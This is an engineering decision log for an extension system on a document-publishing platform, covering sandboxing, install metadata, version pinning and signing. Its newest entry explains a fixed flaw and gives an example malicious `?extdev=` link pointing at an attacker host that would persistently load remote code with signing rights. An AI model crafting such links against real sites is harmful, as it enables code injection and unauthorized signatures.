# Extensions — Decision Log

Newest first. Each entry: what was decided, the alternatives, why.

## 2026-08-31 — `?extdev=` accepts loopback URLs only; session grants are keyed on the code source

**Decision.** `useDevOverride` only writes an override from the page URL when it parses as `http(s)` with a loopback
hostname (`localhost`, `*.localhost`, `127.0.0.1`, `[::1]`); any other value is ignored (the parameter is still
stripped). Overrides for other hosts can only be typed into the desktop Settings editor. The sign dialog shows a warning
while an override is active, the "allow for this session" grant includes the code source in its key, changes to the
`extensions` and `seedExtension` metadata keys are always confirmed, and **Approve** is inert for ~500 ms after the
dialog opens.

**Alternatives.** Accept any `http(s)` URL (the original behaviour); require a native `confirm()` before writing; drop
`?extdev=` on the web entirely and use only the settings editor.

**Why.** The original behaviour was a remote-code-persistence primitive: `useDevOverride` consumed
`?extdev=<any http(s) URL>` with no confirmation, wrote it to `localStorage` keyed only by extension id, stripped the
parameter, and the frame then loaded that URL with the full bridge and the published extension's permissions. Because
`localStorage` is per origin and a gateway such as hyper.media serves every `/hm/<uid>/…` site, a single link
(`https://hyper.media/hm/X/board?extdev=https://attacker.example/e.html`) would silently replace extension E's code for
the victim on every site on that origin where E is installed, persistently, and — with a session grant keyed on
`(extension, site, account)` — sign without a dialog. Restricting to loopback keeps every documented workflow
(`?extdev=http://localhost:5181`, the browser test's `http://127.0.0.1:1/`) working with no extra prompt, while a
hostile link can no longer point a browser at remote code. The dialog warning, the code-source-scoped grant, the
always-confirm keys and the arming delay close the remaining ways an override or a decoy click could turn a grant into a
signature.

## 2026-08-31 — Start with full-page extensions, not custom blocks

**Decision.** The first extension kind is `page`: a whole app under the site header.

**Alternatives.** Custom blocks (the earlier recommendation), theming, custom indexers.

**Why.** Highest user demand (dashboards, kanban boards over documents). It exercises the complete lifecycle —
packaging, install, permissions, sandbox, signing — without touching the editor. Every layer built for pages is
kind-agnostic and is reused for blocks later (see roadmap.md).

## 2026-08-31 — An extension is a document; install is metadata on the home document

**Decision.** Manifest in `metadata.seedExtension` of the extension document; code as an IPFS file referenced by CID;
installs as `metadata.extensions[mountPath]` on the site's home document.

**Alternatives.** A new blob type; a registry service; installing by URL in app settings only.

**Why.** Documents already give us signatures, versions, content addressing, p2p sync, capabilities for who may edit,
and a README page for free. Site-level install being signed data means "who can install" is exactly "who can edit the
home document". `spaceAgents` established the record-in-home-metadata convention.

## 2026-08-31 — Pin by document version by default

**Decision.** Install records carry the extension document `version`. Hosts load that exact version. Updating is an
explicit action.

**Why.** A site owner must decide when the code their readers run changes; content addressing gives us this for free.
Following latest is opt-in (`--latest`).

## 2026-08-31 — Sandboxed iframe via `srcdoc`, single-file entry

**Decision.** The entry is one self-contained HTML file. The host fetches its bytes and loads them into
`<iframe sandbox="allow-scripts …" srcdoc>` (never `allow-same-origin`).

**Alternatives.** Pointing `src` at `/ipfs/<cid>` (daemon serves everything as `application/octet-stream`, and the frame
would share the app origin without sandboxing); UnixFS directories with multiple files (no gateway path routing yet); a
template/declarative UI system (bigger design, do after we have real extensions).

**Why.** Works identically on web and desktop (neither app sets a CSP), avoids content-type and origin questions, and
the opaque origin isolates the extension from the app's cookies, storage and DOM.

## 2026-08-31 — Signing goes through the host's existing `HMSigner`, always confirmed

**Decision.** `sign.comment`, `sign.document`, `sign.data` are bridge methods that the host executes with
`universalClient.getSigner()` after a native confirmation dialog. Raw signatures are domain-separated with a fixed
prefix + extension id.

**Alternatives.** Handing the iframe a session key (rejected: key exfiltration); silent signing for "trusted" extensions
(rejected for v1; a session-scoped "always allow" is the compromise).

**Why.** Requirement: sign as the current user, never expose the key. Both platforms already abstract signing behind
`HMSigner`; the confirmation dialog is the wallet-style UX users understand.

## 2026-08-31 — Mount shadows the document at that path; extensions may use it for state

**Decision.** `resolveExtensionMount` wins over document rendering for the mount path and everything beneath it. The
document at the mount path still exists in the API and is the natural place for an extension to store its state (kanban
does).

**Alternatives.** A reserved prefix (`/x/<name>`), or `:extension` view terms.

**Why.** Sites want clean URLs (`/board`). Sub-path routing is delegated to the extension via `subPath`.

## 2026-08-31 — Dev overrides in localStorage, activated by `?extdev=`

**Decision.** `{[extensionId]: devUrl}` in `localStorage['seed.extensions.devOverrides']`. On web
`?extdev=http://localhost:5181` sets it; desktop has a settings editor.

**Why.** Hot reload against the real host with zero publish round-trips; the override still runs inside the sandbox so
behaviour matches production.
